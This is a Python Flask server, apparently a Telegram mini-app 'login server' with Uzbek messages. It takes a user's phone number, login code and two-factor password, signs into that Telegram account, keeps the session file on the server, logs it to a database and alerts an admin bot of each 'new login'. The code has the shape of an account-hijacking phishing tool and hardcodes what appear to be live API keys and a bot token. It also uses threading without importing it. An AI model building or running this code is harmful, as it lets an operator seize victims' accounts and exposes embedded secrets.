import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon.sync import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError
)
from aiogram import Bot
from database import get_db, init_db

# ======================
# CONFIG
# ======================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
ADMIN_ID = 515902673  # admin bot user id

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

def send_admin_message(text: str):
    async def _send():
        await bot.send_message(ADMIN_ID, text)

    def runner():
        asyncio.run(_send())

    threading.Thread(target=runner, daemon=True).start()


bot = Bot(BOT_TOKEN)

app = Flask(__name__, template_folder="templates")

init_db()

# phone -> {client, hash}
pending = {}

def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

# ======================
# ROUTES
# ======================

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    try:
        if phone in pending:
            pending[phone]["client"].disconnect()
            pending.pop(phone)

        client = TelegramClient(session_path(phone), API_ID, API_HASH)
        client.connect()

        sent = client.send_code_request(phone)

        pending[phone] = {
            "client": client,
            "hash": sent.phone_code_hash
        }

        return jsonify({"status": "code_sent"})

    except FloodWaitError as e:
        return jsonify({"status": "flood_wait", "seconds": e.seconds})

    except PhoneNumberInvalidError:
        return jsonify({"status": "phone_invalid"})

    except Exception as e:
        print("SEND CODE ERROR:", e)
        return jsonify({"status": "error"})

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if phone not in pending:
        return jsonify({"status": "no_code_requested"})

    client = pending[phone]["client"]
    phone_hash = pending[phone]["hash"]

    try:
        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
    except PhoneCodeInvalidError:
        return jsonify({"status": "invalid_code"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})
    except Exception as e:
        print("VERIFY ERROR:", e)
        return jsonify({"status": "error"})

    return finalize_login(client, phone)

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    if phone not in pending:
        return jsonify({"status": "no_session"})

    client = pending[phone]["client"]

    try:
        client.sign_in(password=password)
    except Exception:
        return jsonify({"status": "invalid_password"})

    return finalize_login(client, phone)

# ======================
# FINAL LOGIN
# ======================

def finalize_login(client, phone):
    me = client.get_me()
    user_id = str(me.id)

    conn = get_db()
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO authorized_users (user_id, phone)
        VALUES (%s, %s)
        ON CONFLICT (user_id)
        DO UPDATE SET phone = EXCLUDED.phone
    """, (user_id, phone))
    conn.commit()
    conn.close()

    send_admin_message(
        f"✅ Yangi login\n"
        f"👤 ID: {user_id}\n"
        f"📞 {phone}"
    )

    client.disconnect()
    pending.pop(phone, None)

    return jsonify({"status": "success"})


# ======================
# RUN
# ======================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)




